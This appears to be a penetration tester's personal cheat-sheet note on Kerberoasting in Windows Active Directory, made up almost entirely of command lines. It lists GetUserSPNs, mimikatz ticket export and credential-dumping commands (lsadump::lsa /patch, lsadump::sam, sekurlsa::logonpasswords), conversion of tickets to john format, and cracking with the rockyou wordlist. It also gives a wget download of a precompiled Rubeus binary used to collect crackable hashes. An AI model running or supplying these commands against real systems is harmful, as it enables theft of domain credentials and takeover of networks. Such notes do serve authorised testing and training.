<https://github.com/nidem/kerberoast>
```
powershell -c .\GetUserSPNs.ps1

.\mimikatz.exe
privilege::debug
kerberos::list /export

/opt/tools/kerberoast

Convert kirbi dump to hash for john:
python3 kirbi2john.py 3-40a10000-xor-app59\$@MSSQLSvc\~xor-app23.xor.com\~1433-XOR.COM.kirbi -o MSSQLSvc.txt

john MSSQLSvc.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

all useful dumps:
```
privilege::debug
token::elevate
lsadump::lsa /patch
lsadump::sam
sekurlsa::logonpasswords
```

# Preferred method:
wget <https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe>

.\Rubeus.exe kerberoast /outfile:hashes.txt
then copy to kali.. if any hash contain an “:” then try removing it if it fails cracking it...

.\Rubeus.exe kerberoast /outfile:hashes.txt
![unnamed_ed4276428c8046308988dcfdab0662de](docs/Attachments/_Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Active%20Directory%20Methdology/Attacks/Kerberoast/Kerberoast/{{notename}}-202605011742.png)
